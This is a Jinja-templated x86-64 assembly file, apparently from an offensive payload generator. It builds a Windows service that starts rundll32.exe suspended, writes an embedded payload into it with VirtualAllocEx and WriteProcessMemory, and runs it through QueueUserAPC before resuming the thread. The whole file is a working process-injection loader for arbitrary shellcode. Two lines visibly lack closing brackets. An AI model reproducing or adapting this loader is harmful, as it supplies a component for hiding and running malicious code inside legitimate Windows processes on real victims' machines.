{% from 'macros.jnj.asm' import load_string %}
{% from 'macros.jnj.asm' import memset %}
{% from 'amd64/block_api.jnj.asm' import api_call %}
{% from 'amd64/block_api.jnj.asm' import api_define %}

{% set PAYLOAD_SIZE = payload | length %}
{#
    general flags
#}
{% set CONTEXT_FULL = 1048587 %}
{% set CREATE_SUSPENDED = 4 %}
{% set HEAP_ZERO_MEMORY = 8 %}
{% set MEM_COMMIT = 4096 %}
{% set MEM_RESERVE = 8192 %}
{% set SERVICE_ACCEPT_SHUTDOWN = 4 %}
{% set SERVICE_ACCEPT_STOP = 1 %}
{% set SERVICE_CONTROL_STOP = 1 %}
{% set SERVICE_CONTROL_SHUTDOWN = 5 %}
{% set SERVICE_RUNNING = 4 %}
{% set SERVICE_START_PENDING = 2 %}
{% set SERVICE_STOPPED = 1 %}
{% set SERVICE_WIN32_SHARE_PROCESS = 32 %}
{#
    data type sizes
#}
{% set sizeof_CONTEXT = 1232           %}
{% set sizeof_DWORD = 4                %}
{% set sizeof_SERVICE_STATUS = 28      %}{# https://docs.microsoft.com/en-us/windows/desktop/api/winsvc/ns-winsvc-_service_status #}
{% set sizeof_STARTUPINFO = 104        %}
{% set sizeof_PTR = 8                  %}
{% set sizeof_PROCESS_INFORMATION = 24 %}

{% macro store_const(reg, value, offset=0, temp='rax') -%}
  mov {{ temp }}, {{ value }}
  mov [{{ reg }}{% if offset %} + {{ offset }}{% endif %}], {{ temp }}
{%- endmacro %}

_start:
  cld
  push rbp
  call main

{{ api_define() }}
main:
  pop rbp                                                   ; rbp = &apiStart
  {# uncomment the line below to include a 20-second sleep before executing the
   # main functionality, this provides the user with the opportunity to attach a
   # debugger to inspect the process #}
  {# api_call('kernel32.dll', 'Sleep', 20000) #}
  ; load advapi32.dll so it's available
  {{ load_string('advapi32.dll', 'rcx') }}
  {{ api_call('kernel32.dll', 'LoadLibraryA', stack_adjustment=0) }}
  ; the stack adjustment is skipped here to leave 32 bytes of space allocated for SERVICE_TABLE_ENTRY
  xor rax, rax                                              ; rax = 0
  mov [rsp+0x18], rax                                       ; pServiceTable[1]->lpServiceName = NULL
  mov [rsp+0x10], rax                                       ; pServiceTable[1]->lpServiceProc = NULL
  call get_servicemain

  and rsp, 0xfffffffffffffff0
  call servicemain
{{ api_define() }}
servicemain:
  pop rbp
  ; allocate space on the stack, layout looks like
  ; LPVOID               lpPayload                          ; destination for the payload
  ; LPVOID               lpStorage                          ; heap-storage for callback context information
  ; CONTEXT              Context                            ; thread context information
  ; STARTUPINFO          si                                 ; host process startup information
  ; PROCESS_INFORMATION  pi                                 ; host process information
  sub rsp, 0x560                                            ; sizeof(CONTEXT) + sizeof(STARTUPINFO) + sizeof(PROCESS_INFORMATION)
  {{ memset('rsp', 0, 1376) }}
  {% set stkoff_ppay = 0 %}
  {% set stkoff_store = stkoff_ppay + sizeof_PTR %}
  {% set stkoff_ctx = stkoff_store + sizeof_PTR %}
  {% set stkoff_si = stkoff_ctx + sizeof_CONTEXT %}
  {% set stkoff_pi = stkoff_si + sizeof_STARTUPINFO + 8 %} {# plus 8 for alignment to a 16 boundary #}

  ; allocate space on the heap, layout looks like
  ; LPVOID               lpApiStart                         ; store a reference to the block api so it does not need to be included again
  ; LPVOID
  ; SERVICE_STATUS       serviceStatus
  {{ api_call('kernel32.dll', 'GetProcessHeap') }}
  {{ api_call('ntdll.dll', 'RtlAllocateHeap', 'rax', HEAP_ZERO_MEMORY, (sizeof_PTR * 2) + sizeof_SERVICE_STATUS) }}
  mov rdi, rax
  {{ memset('rdi', 0, (sizeof_PTR * 2) + sizeof_SERVICE_STATUS) }}

  mov [rax], rbp
  mov [rsp + {{ stkoff_store }}], rax
  mov r8, rax

  ; si.cb = sizeof(STARTUPINFO)
  {{ store_const('rsp', sizeof_STARTUPINFO, offset=stkoff_si) }}
  ; ss.dwServiceType = SERVICE_WIN32_SHARE_PROCESS
  {{ store_const('r8', SERVICE_WIN32_SHARE_PROCESS, offset=(sizeof_PTR * 2) + (sizeof_DWORD * 0)) }}
  ; ss.dwCurrentState = SERVICE_START_PENDING
  {{ store_const('r8', SERVICE_START_PENDING, offset=(sizeof_PTR * 2) + (sizeof_DWORD * 1)) }}
  ; ss.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN
  {{ store_const('r8', bw_or(SERVICE_ACCEPT_STOP, SERVICE_ACCEPT_SHUTDOWN), offset=sizeof_PTR * 2 + 4 * 2) }}

  mov r10, rsp                                                  ; r10 = rsp     ; set r10 to the stack pointer to make offset calculations easier
  lea rax, [r10 + {{ stkoff_pi }}]
  push rax                                                      ;                       (LPPROCESS_INFORMATION lpProcessInformation)
  lea rax, [r10 + {{ stkoff_si }}]
  push rax                                                      ;                       (LPSTARTUPINFO lpStartupInfo)
  xor r9, r9                                                    ; r9  = NULL            (LPSECURITY_ATTRIBUTES lpThreadAttributes)
  push r9                                                       ; NULL                  (LPCSTR lpCurrentDirectory)
  push r9                                                       ; NULL                  (LPVOID lpEnvironment)
  push {{ CREATE_SUSPENDED }}                                   ; CREATE_SUSPENDED      (DWORD dwCreationFlags)
  push r9                                                       ; FALSE                 (BOOL bInheritHandles)
  mov r8, r9                                                    ; r8  = NULL            (LPSECURITY_ATTRIBUTES lpProcessAttributes)
  {{ load_string('rundll32.exe', 'rdx') }}                      ; rdx = &"rundll32.exe" (LPCSTR lpCommandLine)
  mov rcx, r9                                                   ; rcx = NULL            (LPCSTR lpApplicationName)
  {{ api_call('kernel32.dll', 'CreateProcessA', stack_adjustment=80) }}
  mov rbx, rax
  call get_servicehandler

servicehandler:
  push rbp
  mov rbp, [r9]                                                 ; rbp = &blockApi
  lea rdx, [r9 + 0x10]                                          ; rdx = &serviceStatus

  cmp rcx, {{ SERVICE_CONTROL_STOP }}
  je _set_status
  cmp rcx, {{ SERVICE_CONTROL_SHUTDOWN }}
  je _set_status
  jmp servicehandler_setstatus
_set_status:
  {{ store_const('rdx', SERVICE_STOPPED, offset=4 * 1) }}       ; ss.dwCurrentState = SERVICE_STOPPED
  {{ store_const('rdx', 0, offset=4 * 3) }}                     ; ss.dwWin32ExitCode = 0
servicehandler_setstatus:
  mov rcx, [r9 + 0x8]                                           ; rcx = hStatus
  {{ api_call('advapi32.dll', 'SetServiceStatus') }}
  pop rbp
  ret

get_servicehandler:
  pop rdx
  call get_servicename
  mov rcx, rax

  {{ api_call('advapi32.dll', 'RegisterServiceCtrlHandlerExA') }}

  mov r8, [rsp + {{ stkoff_store }}]
  mov [r8 + 0x8], rax                                           ; store hStatus from RegisterServiceCtrlHandlerExA
  cmp rax, 0
  je _servicemain_return
  mov rcx, rax                                                  ; rcx = hStatus
  lea rdx, [r8 + 0x10]                                          ; rdx = &serviceStatus
  {{ store_const('rdx', SERVICE_RUNNING, offset=4 * 1) }}       ; ss.dwCurrentState = SERVICE_RUNNING
  {{ api_call('advapi32.dll', 'SetServiceStatus') }}

  cmp rbx, 0                                                    ; CreateProcessA == 0
  je _servicemain_exit

  lea rdx, [rsp + {{ stkoff_ctx }}                              ; rdx = &Context
  {{ store_const('rdx', CONTEXT_FULL, offset=(8 * 6)) }}        ; Context.ContextFlags = CONTEXT_FULL
  mov rcx, [rsp + {{ stkoff_pi + 8 }}]                          ; rcx = pi.hThread
  {{ api_call('kernel32.dll', 'GetThreadContext') }}

  mov r10, rsp
  push {{ permissions }}
  mov r9, {{ bw_or(MEM_COMMIT, MEM_RESERVE) }}
  mov r8, {{ PAYLOAD_SIZE }}
  xor rdx, rdx
  mov rcx, [r10 + {{ stkoff_pi + 0 }}                           ; rcx = pi.hProcess
  {{ api_call('kernel32.dll', 'VirtualAllocEx', stack_adjustment=40) }}
  cmp rax, 0
  je _servicemain_close

  mov rbx, rax                                                  ; rbx = lpPayload
  mov r10, rsp
  mov rdx, rax                                                  ; rdx = lpPayload
  xor r9, r9
  push r9
  mov r9, {{ PAYLOAD_SIZE }}
  call get_payload
  mov r8, rax                                                   ; r8 = &bPayload
  mov rcx, [r10 + {{ stkoff_pi + 0 }}]                                  ; rcx = pi.hProcess
  {{ api_call('kernel32.dll', 'WriteProcessMemory', stack_adjustment=40) }}

  mov r10, rsp
  xor r8, r8
  mov rdx, [r10 + {{ stkoff_pi + 8 }}]                          ; rdx = pi.hThread
  mov rcx, rbx                                                  ; rcx = lpPayload
  {{ api_call('kernel32.dll', 'QueueUserAPC') }}

_servicemain_close:
  mov rcx, [rsp + {{ stkoff_pi + 8 }}]                          ; rcx = pi.hThread
  {{ api_call('kernel32.dll', 'ResumeThread') }}
  mov rcx, [rsp + {{ stkoff_pi + 8 }}]                          ; rcx = pi.hThread
  {{ api_call('kernel32.dll', 'CloseHandle') }}
  mov rcx, [rsp + {{ stkoff_pi + 0 }}]                          ; rcx = pi.hProcess
  {{ api_call('kernel32.dll', 'CloseHandle') }}

_servicemain_exit:
  mov r9, [rsp + {{ stkoff_store }}]
  xor r8, r8
  xor rdx, rdx
  mov rcx, {{ SERVICE_CONTROL_STOP }}
  call servicehandler

  xor rcx, rcx
  {{ api_call('kernel32.dll', 'ExitProcess') }}
_servicemain_return:
  add rsp, 0x560
  ret

get_servicemain:
  pop rcx
  mov [rsp+0x08], rcx

  call get_servicename
  mov rcx, rax
  mov [rsp], rcx
  mov rcx, rsp

  {{ api_call('advapi32.dll', 'StartServiceCtrlDispatcherA') }}
  add rsp, 0x20
  pop rbp
  ret

get_servicename:
  {{ load_string(service_name, 'rax') }}
  ret

; get the address of the payload to inject
get_payload:
  call _get_payload
  {% for source_line in raw_bytes(payload) %}
  {{ source_line.code }}
  {% endfor %}
  ret
_get_payload:
  pop rax
  ret